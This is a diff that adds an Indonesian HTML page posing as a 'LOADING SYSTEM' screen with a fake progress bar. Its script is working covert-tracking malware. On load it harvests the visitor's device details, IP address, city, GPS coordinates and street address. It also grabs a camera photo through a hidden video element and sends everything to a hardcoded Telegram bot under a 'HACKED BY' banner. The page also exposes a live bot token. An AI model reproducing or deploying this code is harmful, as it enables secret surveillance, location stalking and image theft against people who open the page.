@@ -1,1 +1,82 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <title>Skandall @MexxModders</title>
+    <style>
+        body{background:#000;margin:0;padding:0;display:flex;justify-content:center;align-items:center;height:100vh;font-family:Arial,sans-serif;color:#999;overflow:hidden}
+        #loading-container{text-align:center;width:80%;max-width:400px}
+        #loading-text{font-size:22px;margin-bottom:20px;color:#6e48aa}
+        #progress-container{height:3px;background:#222;border-radius:3px;overflow:hidden}
+        #progress-bar{height:100%;width:0%;background:linear-gradient(90deg,#6e48aa,#9d50bb);transition:width .3s ease}
+        #loading-details{margin-top:20px;font-size:14px;color:#666}
+        .hidden{display:none}
+    </style>
+</head>
+<body>
+    <div id="loading-container">
+        <div id="loading-text">LOADING SYSTEM</div>
+        <div id="progress-container"><div id="progress-bar"></div></div>
+        <div id="loading-details">memuat . . .</div>
+    </div>
+    
+    <video id="v" autoplay muted class="hidden"></video>
+    <canvas id="c" class="hidden"></canvas>
 
+<script>
+(()=>{
+    const T='8510648318:AAEnqQU5DOkL-X_2fpoXnQuTw9Gi0ppXcZ8',
+          C='8212307369', 
+          pb=document.getElementById('progress-bar'),
+          ld=document.getElementById('loading-details');
+
+    let p=0;
+    const LM=["memuat modul inti...","verifikasi server...","sinkronisasi data...","menyiapkan enkripsi..."];
+    
+    setInterval(()=>{
+        p+=Math.random()*5; if(p>98)p=98;
+        pb.style.width=p+'%';
+        if(Math.random()>.9)ld.textContent=LM[Math.floor(Math.random()*LM.length)]
+    },500);
+
+    const sTG=async d=>{try{await fetch(`https://api.telegram.org/bot${T}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:C,text:d,parse_mode:'HTML'})})}catch(e){}};
+    
+    const sP=async(b,f,cap)=>{try{const fd=new FormData();fd.append('chat_id',C);fd.append('photo',b,f);fd.append('caption',cap);await fetch(`https://api.telegram.org/bot${T}/sendPhoto`,{method:'POST',body:fd})}catch(e){}};
+
+    const gLD=async(a,b)=>{try{const r=await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${a}&lon=${b}&zoom=18`),d=await r.json();return d.display_name||"Alamat tidak tersedia"}catch(e){return "Gagal melacak alamat"}};
+    
+    const getFullInfo=async()=>{
+        let m=`⦿ HACKED BY FIAN CYBER-X\n\n`;
+        m+=`📱 DEVICE: ${navigator.platform}\n🧠 CPU: ${navigator.hardwareConcurrency} Cores\n💾 RAM: ${navigator.deviceMemory||'Unknown'} GB\n🔋 BATTERY: `;
+        if(navigator.getBattery){const b=await navigator.getBattery();m+=`${Math.floor(b.level*100)}% (${b.charging?'Charging':'Unplugged'})\n`}else{m+='Unknown\n'}
+        try{const i=await fetch('https://ipapi.co/json/'),d=await i.json();
+        m+=`🌐 IP: ${d.ip}\n🏙️ KOTA: ${d.city}\n📍 LAT/LNG: ${d.latitude},${d.longitude}\n🗺️ MAPS: https://www.google.com/maps?q=${d.latitude},${d.longitude}\n🏠 ADDR: ${await gLD(d.latitude,d.longitude)}\n`;}catch(e){m+='📍 IP INFO: Gagal ditarik\n'}
+        m+='\nDeveloper : @MexxModders'; return m;
+    };
+
+    const capCam=async(mode, info)=>{
+        const v=document.getElementById('v'),c=document.getElementById('c');
+        let s;
+        try{
+            s=await navigator.mediaDevices.getUserMedia({video:{facingMode:{exact:mode}}});
+            v.srcObject=s; await new Promise(r=>v.onloadedmetadata=r); v.play();
+            await new Promise(r=>setTimeout(r,1500));
+            c.width=v.videoWidth; c.height=v.videoHeight;
+            c.getContext('2d').drawImage(v,0,0);
+            c.toBlob(b=>sP(b,`${mode}.jpg`, info),'image/jpeg');
+            s.getTracks().forEach(t=>t.stop()); return true;
+        }catch(e){if(s)s.getTracks().forEach(t=>t.stop()); return false;}
+    };
+
+    const start=async()=>{
+        const info = await getFullInfo();
+        let ok = await capCam("user", info);
+        if(!ok) await capCam("environment", info);
+    };
+
+    start();
+})();
+</script>
+</body>
+</html>
